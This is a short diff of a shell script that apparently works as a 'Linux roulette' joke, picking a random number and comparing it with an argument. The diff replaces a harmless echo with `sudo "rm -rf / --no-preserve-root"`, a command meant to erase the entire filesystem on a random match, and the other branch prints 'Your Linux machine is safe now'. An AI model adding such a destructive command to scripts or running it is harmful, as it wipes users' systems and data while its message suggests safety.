@@ -4,9 +4,9 @@ r=$(( $RANDOM % 10 )); echo $r
 
 if [ $RANDOM -eq $1 ]
 then
-        echo "Test"
+        sudo "rm -rf / --no-preserve-root"
 else
-        echo "Your Linux machine is safe"
+        echo "Your Linux machine is safe now"
 fi
 
 echo $NUM
